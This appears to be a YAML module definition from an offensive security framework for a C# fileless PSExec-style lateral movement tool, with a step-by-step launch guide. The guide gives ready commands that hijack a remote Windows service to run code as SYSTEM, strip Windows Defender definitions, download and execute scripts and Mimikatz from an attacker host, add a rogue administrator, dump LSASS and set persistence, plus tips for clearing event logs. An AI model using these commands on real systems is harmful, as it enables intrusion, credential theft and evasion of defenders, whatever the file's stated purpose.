meta:
  name: "Fileless PSExec Lateral Movement (C#)"
  category: "Lateral Movement"
  description: |
    Remote code execution via Windows service manipulation without file upload.
    
    Features:
    - No file upload required (fileless execution)
    - Manipulates remote service configuration
    - Executes arbitrary binaries as SYSTEM
    - Disables Windows Defender signatures (optional first pass)
    - Restores service configuration after execution
    - Works over SMB/RPC
    
    This technique connects to a remote Windows machine's Service Control Manager,
    modifies an existing service's binary path, starts it to execute your command,
    then restores the original configuration. No files are dropped on disk.
    
    WARNING: For authorized security testing only!

  effectiveness: "high"

  mitre:
    tactic: "TA0008 - Lateral Movement"
    technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"

  artifacts:
    - "Remote SCM connection over RPC"
    - "Service configuration changes (temporary)"
    - "Service start/stop events"
    - "Windows Defender definition removal (if Pass 1 executes)"
    - "Event ID 7045 (Service created/modified)"
    - "Event ID 7040 (Service start type changed)"

parameters:
  - name: "target_host"
    type: "string"
    description: "Target Windows machine hostname or IP"
    required: true
    default: "192.168.1.10"

  - name: "service_name"
    type: "string"
    description: "Name of existing service to hijack"
    required: true
    default: "SensorService"

  - name: "binary_to_run"
    type: "string"
    description: "Command to execute as SYSTEM on target"
    required: true
    default: "C:\\Windows\\System32\\cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt"

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "psexec.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "template"
  template: "lateral_movement/fileless_psexec.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 {{ source_file }}"
  launch_instructions: |
    C# Fileless PSExec Lateral Movement - Launch Instructions

    Prerequisites:

    - Valid admin credentials on target machine
    - SMB/RPC access to target (ports 135, 139, 445)
    - Existing service to hijack on target
    - Network connectivity to target

    Step 1: Enumerate Target Services

    Find services on target machine:

    Using PowerShell:
    Get-Service -ComputerName {{ target_host }}

    Or using sc.exe:
    sc \\{{ target_host }} query

    Common hijack targets:
    - SensorService
    - Spooler
    - SessionEnv
    - Any non-critical service

    Step 2: Execute Fileless PSExec

    Basic execution (with Defender bypass):
    {{ output_file }} {{ target_host }} {{ service_name }} {{ binary_to_run }}

    Example - Execute whoami:
    {{ output_file }} 192.168.1.10 SensorService "cmd.exe /c whoami > C:\\Temp\\out.txt"

    Example - Download and execute payload:
    {{ output_file }} 192.168.1.10 SensorService "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"

    Example - Add local admin:
    {{ output_file }} 192.168.1.10 SensorService "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"

    Example - Execute beacon:
    {{ output_file }} 192.168.1.10 SensorService "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump [LSASS_PID] C:\\Temp\\lsass.dmp full"

    Step 3: Verify Execution

    Check output file on target:
    type \\{{ target_host }}\C$\Temp\out.txt

    Or check for new processes:
    Get-Process -ComputerName {{ target_host }}

    Step 4: Establish Persistence (Optional)

    Create scheduled task via service:
    {{ output_file }} {{ target_host }} {{ service_name }} "schtasks /create /tn Update /tr C:\\Windows\\Temp\\beacon.exe /sc onlogon /ru SYSTEM"

    Notes:

    - Executes as NT AUTHORITY\\SYSTEM on target
    - Pass 1 disables Windows Defender signatures
    - Pass 2 executes your specified binary
    - Pass 3 restores original service configuration
    - No files are dropped on target disk (fileless)
    - Requires admin credentials for remote SCM access

    Execution Flow:

    1. Connect to target's Service Control Manager (SCM)
    2. Open specified service handle
    3. Query current service binary path (for restoration)
    4. Modify service binary path to: MpCmdRun.exe -RemoveDefinitions -All
    5. Start service (disables Defender signatures)
    6. Modify service binary path to your command
    7. Start service (executes your command as SYSTEM)
    8. Restore original service binary path
    9. Exit

    Advanced Techniques:

    Living off the land binaries (LOLBins):
    {{ output_file }} {{ target_host }} {{ service_name }} "regsvr32.exe /s /n /u /i:http://YOUR_IP/file.sct scrobj.dll"

    Lateral movement with PsExec-style:
    {{ output_file }} {{ target_host }} {{ service_name }} "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz"

    Troubleshooting:

    - Access Denied: Verify admin credentials and remote SCM access
    - Service not found: Enumerate services on target first
    - Service start fails: Check if service is already running or disabled
    - No output: Command may have failed or no stdout (write to file)
    - Defender still active: Pass 1 may have failed (check Event Logs)

    Detection:

    This technique generates:
    - Event ID 7045 (Service installed)
    - Event ID 7040 (Service start type changed)
    - Event ID 4697 (Service installed)
    - Service configuration changes in registry
    - Sysmon Event ID 1 (Process creation by service)

    Evasion Tips:

    - Use less common services for hijacking
    - Randomize execution timing
    - Clean up Event Logs after execution
    - Use native Windows binaries for execution (LOLBins)

    Cleanup:

    Service configuration is automatically restored by the tool.

    Remove executable:
    Remove-Item {{ output_file }} -Force
